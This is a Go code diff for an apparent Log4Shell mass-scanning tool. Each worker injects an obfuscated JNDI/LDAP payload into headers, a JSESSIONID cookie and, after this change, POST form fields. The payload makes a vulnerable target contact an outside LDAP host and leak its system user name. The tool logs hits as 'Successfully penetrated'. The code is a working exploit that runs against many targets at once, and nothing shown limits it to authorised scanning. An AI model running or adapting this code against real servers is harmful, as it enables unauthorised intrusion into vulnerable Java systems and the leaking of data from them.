@@ -11,7 +11,9 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	log "github.com/sirupsen/logrus"
@@ -97,14 +99,38 @@ var (
 		"X-Wap-Profile",
 		"X-XSRF-TOKEN",
 	}
+	postParams = []string{
+		"username",
+		"user",
+		"email",
+		"password",
+		"csrf_token",
+		"id",
+		"action",
+		"page",
+		"q",
+		"search",
+		"s",
+		"submit",
+		"message",
+		"msg",
+		"text",
+		"login",
+		"lang",
+		"method",
+		"data",
+	}
 )
 
 type app struct {
-	client    *http.Client
-	wg        *sync.WaitGroup
-	inChan    <-chan string
-	outChan   chan<- string
-	errorChan chan<- error
+	client       *http.Client
+	wg           *sync.WaitGroup
+	inChan       <-chan string
+	outChan      chan<- string
+	errorChan    chan<- error
+	httpRequests int64
+	goodRequests int64
+	badRequests  int64
 }
 
 var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
@@ -215,6 +241,9 @@ func main() {
 	close(outChan)
 	// wait for error and output channel to finish
 	wgMain.Wait()
+	log.Infof("Bad Requests: %d", app.badRequests)
+	log.Infof("Good Requests: %d", app.goodRequests)
+	log.Infof("Total Requests: %d", app.httpRequests)
 }
 
 func (a *app) worker() {
@@ -233,20 +262,44 @@ func (a *app) worker() {
 		host := fmt.Sprintf("%s.%s", u.Hostname(), *domain)
 		payload := fmt.Sprintf("${${::-j}${::-n}${::-d}${::-I}:ldap://${sys:user.name}.%s/%s}", host, randString(5))
 		log.Debug(payload)
-		if err := a.request(ctx, x, payload); err != nil {
+		statusCode, err := a.request(ctx, http.MethodGet, x, payload, nil)
+		if err != nil {
+			atomic.AddInt64(&a.badRequests, 1)
 			a.errorChan <- err
 			continue
 		}
-		a.outChan <- fmt.Sprintf("Successfully penetrated %s", x)
+		a.outChan <- fmt.Sprintf("Successfully penetrated with GET %s", x)
+		atomic.AddInt64(&a.goodRequests, 1)
+
+		if statusCode == 404 {
+			// no need for POSTing when the site returns a 404 anyways
+			continue
+		}
+
+		// now try posting
+		postData := url.Values{}
+		for _, p := range postParams {
+			postData.Set(p, payload)
+		}
+
+		_, err = a.request(ctx, http.MethodPost, x, payload, strings.NewReader(postData.Encode()))
+		if err != nil {
+			atomic.AddInt64(&a.badRequests, 1)
+			a.errorChan <- err
+			continue
+		}
+
+		a.outChan <- fmt.Sprintf("Successfully penetrated with POST %s", x)
+		atomic.AddInt64(&a.goodRequests, 1)
 	}
 
 	log.Debug("worker done")
 }
 
-func (a *app) request(ctx context.Context, url, payload string) error {
-	r, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
+func (a *app) request(ctx context.Context, method, url, payload string, body io.Reader) (int, error) {
+	r, err := http.NewRequestWithContext(ctx, method, url, body)
 	if err != nil {
-		return err
+		return -1, err
 	}
 
 	for _, h := range headerNames {
@@ -254,7 +307,7 @@ func (a *app) request(ctx context.Context, url, payload string) error {
 	}
 
 	r.AddCookie(&http.Cookie{
-		Name:    "Session",
+		Name:    "JSESSIONID",
 		Value:   payload,
 		Path:    "/",
 		Expires: time.Now().Add(8760 * time.Hour),
@@ -268,15 +321,21 @@ func (a *app) request(ctx context.Context, url, payload string) error {
 	r.Header.Set("Connection", "close")
 	r.Header.Set("Accept", "*/*")
 
+	if method == http.MethodPost {
+		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+
 	resp, err := a.client.Do(r)
 	if err != nil {
-		return err
+		return -1, err
 	}
 	defer resp.Body.Close()
 	_, err = io.Copy(io.Discard, resp.Body)
 	if err != nil {
-		return err
+		return -1, err
 	}
 
-	return nil
+	atomic.AddInt64(&a.httpRequests, 1)
+
+	return resp.StatusCode, nil
 }
